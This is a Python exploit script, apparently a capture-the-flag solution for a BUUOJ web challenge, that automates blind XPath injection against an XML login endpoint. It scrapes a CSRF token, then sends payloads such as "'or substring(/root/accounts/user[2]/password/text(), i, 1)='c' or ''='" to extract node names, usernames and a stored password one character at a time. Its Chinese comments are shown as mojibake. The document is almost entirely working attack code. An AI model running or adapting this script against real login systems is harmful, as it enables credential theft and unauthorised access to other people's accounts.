import requests
import re
import time

s = requests.session()
url = 'http://558d29e2-c9f6-448d-884f-4176a84fa0dd.node3.buuoj.cn/'

head = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",
    "Content-Type": "application/xml"
}
find = re.compile('<input type="hidden" id="token" value="(.*?)" />')

strs = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'

flag = ''
for i in range(1, 100):

    for j in strs:
        r = s.post(url=url)
        token = find.findall(r.text)
        time.sleep(0.1)

        # �²���ڵ�����
        # payload_1 = "<username>'or substring(name(/*[1]), {}, 1)='{}' or ''='</username><password>1</password><token>{}</token>".format(
        #     i, j, token[0])
        # �²��ӽڵ�����
        # payload_2 = "<username>'or substring(name(/root/*[1]), {}, 1)='{}'  or ''='</username><password>1</password><token>{}</token>".format(
        #     i, j, token[0])

        # �²�accounts�Ľڵ�
        # payload_3 = "<username>'or substring(name(/root/accounts/*[1]), {}, 1)='{}'  or ''='</username><password>1/password><token>{}</token>".format(
        #     i, j, token[0])

        # �²�user�ڵ�
        # payload_4 = "<username>'or substring(name(/root/accounts/user/*[2]), {}, 1)='{}'  or ''='</username><password>1</password><token>{}</token>".format(
        #     i, j, token[0])

        # ���û���������
        # payload_username = "<username>'or substring(/root/accounts/user[2]/username/text(), {}, 1)='{}'  or ''='</username><password>1</password><token>{}</token>".format(
        #     i, j, token[0])

        payload_password = "<username>'or substring(/root/accounts/user[2]/password/text(), {}, 1)='{}'  or ''='</username><password>1</password><token>{}</token>".format(
            i, j, token[0])

        # ����payload
        payload = payload_password

        # print(payload)
        r = s.post(url=url, headers=head, data=payload)
        # print(r.text)

        if "�Ƿ�����" in r.text:
            flag += j
            print(flag)
            break

    if "�û���" in r.text:
        break

print(flag)